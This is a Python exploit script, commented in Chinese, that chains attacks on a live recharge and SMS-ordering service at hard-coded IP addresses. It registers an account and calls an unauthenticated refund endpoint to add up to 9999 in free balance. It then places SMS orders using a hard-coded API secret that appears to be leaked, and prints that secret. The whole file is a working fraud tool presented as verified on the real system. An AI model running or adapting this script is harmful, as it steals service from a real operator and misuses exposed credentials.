#!/usr/bin/env python3
"""
一码快查 免费无限充值 + SMS 下单完整链（实机验证）

漏洞: POST /api/desktop/refund-balance 无鉴权，任意 user 账户加余额。

用法:
  python3 tools/free_recharge_chain.py
  python3 tools/free_recharge_chain.py --amount 100 --phone 13800138000
"""
from __future__ import annotations

import argparse
import json
import re
import sys
import time
import urllib.error
import urllib.request

MAIN = "http://43.154.128.116:9110"
SMS = "http://47.76.163.227:8081"
API_SECRET = "b9887333ae4c43858c9235e0ac4e0921"


def jreq(method: str, url: str, payload: dict | None = None) -> tuple[int, dict | str]:
    data = json.dumps(payload).encode() if payload is not None else None
    headers = {"Content-Type": "application/json"} if data else {}
    req = urllib.request.Request(url, data=data, method=method, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=15)
        raw = resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            return e.code, json.loads(raw)
        except json.JSONDecodeError:
            return e.code, raw
    try:
        return 200, json.loads(raw)
    except json.JSONDecodeError:
        return 200, raw


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--username", help="已有用户名（默认自动注册）")
    ap.add_argument("--password", default="chain12345")
    ap.add_argument("--amount", type=float, default=9999.0)
    ap.add_argument("--phone", default="13800138000")
    ap.add_argument("--area", default="86")
    ap.add_argument("--deduct", type=float, default=3.0, help="下单前扣费金额")
    args = ap.parse_args()

    user = args.username or f"free_{int(time.time())}"
    if not args.username:
        code, body = jreq("POST", f"{MAIN}/api/desktop/register", {"username": user, "password": args.password})
        print(f"[1] register {user} -> {code} {body}")
        if isinstance(body, dict) and not body.get("ok"):
            sys.exit(1)

    _, before = jreq("GET", f"{MAIN}/api/desktop/user-info?username={user}")
    print(f"[2] balance before: {before}")

    _, refund = jreq(
        "POST",
        f"{MAIN}/api/desktop/refund-balance",
        {"username": user, "amount": args.amount},
    )
    print(f"[3] refund +{args.amount} -> {refund}")

    _, after = jreq("GET", f"{MAIN}/api/desktop/user-info?username={user}")
    print(f"[4] balance after refund: {after}")

    create_url = f"{SMS}/create/{API_SECRET}"
    code, sms = jreq("POST", create_url, {"area": args.area, "data": args.phone})
    print(f"[5] SMS create -> {code} {sms}")
    order_id = None
    if isinstance(sms, dict) and sms.get("code") == 0:
        order_id = sms.get("data")

    if args.deduct > 0:
        _, dec = jreq(
            "POST",
            f"{MAIN}/api/desktop/decrease-balance",
            {"username": user, "amount": args.deduct},
        )
        print(f"[6] decrease -{args.deduct} -> {dec}")

    _, final = jreq("GET", f"{MAIN}/api/desktop/user-info?username={user}")
    print(f"[7] final balance: {final}")

    if order_id:
        qurl = f"{SMS}/query/{API_SECRET}?order_id={order_id}"
        try:
            req = urllib.request.Request(qurl)
            with urllib.request.urlopen(req, timeout=12) as r:
                print(f"[8] SMS query -> {r.read().decode()[:300]}")
        except urllib.error.HTTPError as e:
            print(f"[8] SMS query -> {e.code} {e.read().decode()[:200]}")

    print("\n=== 链完成 ===")
    print(f"user={user} secret={API_SECRET}")


if __name__ == "__main__":
    main()
